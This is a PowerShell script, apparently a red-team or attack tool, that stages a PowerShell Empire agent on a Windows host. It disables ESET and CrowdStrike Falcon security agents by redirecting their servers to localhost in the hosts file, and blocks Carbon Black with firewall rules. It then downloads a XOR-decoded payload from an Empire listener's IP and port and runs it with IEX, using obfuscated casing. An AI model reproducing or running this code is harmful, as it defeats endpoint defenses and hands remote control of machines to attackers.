function Invoke-Agent
{
    <#  WrittenBy: KBang Date: 10/1/2015 
        This script should be executed with elevated privileges (e.g. bypassuac)
        The Parameters required are empireIP, empirePort and empireKey. This values should come straight from the listener within Empire.
        This script will first validate parameters, disable ESET, Falcon and Carbon black, and finally initiate a powershell connection to the remote Empire #>      

    param (
        # Default Strings, should be replaced via command line arguments. 
        [string]$empireIP,  
        [string]$empirePort,
        [string]$empireKey
    )

    <#  disableESEAndFalcon function adds localhost mapping to the hosts file for ESET's SMTP/Central Server and each of the 3 Falcon Servers
        The three central Falcon servers listed in the documentation are: ts01-b.cloudsink.net, lfodown01-b.cloudsink.net, lfoup01-b.cloudsink.net #>
    
    function Local:DisableESETAndFalcon {
        # Pull Host File 
        $hostFilePath="$env:windir\System32\drivers\etc\hosts"
        $hosts=Get-Content $hostFilePath
    
        # Add Bad Route for Falcon Servers
        ForEach ($server in $crowdStrikeServers) {
            $hosts+=("127.0.0.1" + "`t" + $server)
        }   
    
        # Pull ESET Config Registries and Add Bad Routes
        $esetReg = Get-ItemProperty "HKLM:Software\ESET\ESET Security\CurrentVersion\Plugins\01000600\Profiles\@My profile"  
        if ($esetReg) {
            $hosts+=("127.0.0.1" + "`t" + $esetReg.RAClientServer)
            $hosts+=("127.0.0.1" + "`t" + $esetReg.SMTP_Server)
        }
    
        $hosts | Out-File $hostFilePath -enc ascii 
    }

    function Local:DisableCB {
        # Add firewall rule to block outbound traffic for CB IP and cb.exe process 
        netsh advfirewall firewall add rule name="cbblock1" dir=out action=block enable=yes interfacetype=any protocol=any remoteip=10.130.0.133
        netsh advfirewall firewall add rule name="cbblock2" dir=out action=block enable=yes interfacetype=any protocol=any program="‪C:\Windows\CarbonBlack\cb.exe"
    }

    # Array Defining Falcons Servers
    $crowdStrikeServers="ts01-b.cloudsink.net", "lfodown01-b.cloudsink.net", "lfoup01-b.cloudsink.net"
 
   if ($psboundparameters.count -ne 3) {
        echo "Incorrect Number of Parametr: $($psboundparameters.count)`nUsage: agent.ps1 -empireIP <remoteIP> -empirePort <remoteport> -empireKey <base64_encoded_key>"
        Exit 
    }
    else {
        # Validate Empire IP Provided is a valid IP Address
        $ipObj = [System.Net.IPAddress]::parse($empireIP)
        $isValidIP = [System.Net.IPAddress]::tryparse([string]$empireIP, [ref]$ipObj)
        $decodedKey = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($empireKey))

        if ($isValidIP -and $psboundparameters.count -eq 3) {
            # Disable ESET, Falcon and Carbon Black
            DisableESETAndFalcon 
            DisableCB
            cmd /c "ipconfig /release && ipconfig /renew"
    
            # Setup and Execute Empire Agent 
            $Wc=NeW-ObJecT SySTeM.Net.WeBCLIent;
            $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
            $wc.HeADERS.ADd('User-Agent',$u);
            $wC.PRoxY = [SYsTeM.Net.WebREQuEsT]::DEFAUlTWebProxY;
            $WC.PROxY.CReDenTiALS = [SYsTEm.NeT.CreDEnTIalCacHe]::DEfAuLtNEtworKCRedeNTIaLS;
            $i=0;
            $dlString="http://" + $empireIP + ":" + $empirePort + "/index.asp" 
            [ChAr[]]$B=([cHAR[]]($wC.DOwNlOADStRinG($dlString)))|%{$_-bXOr$decodedKey[$I++%$decodedKey.LEngTh]};
            IEX ($B-JOin'')
        }
        else {
            echo "[$empireIP] Not a valid IP.. Please try again with a valid IP Address."
        }
    }

}            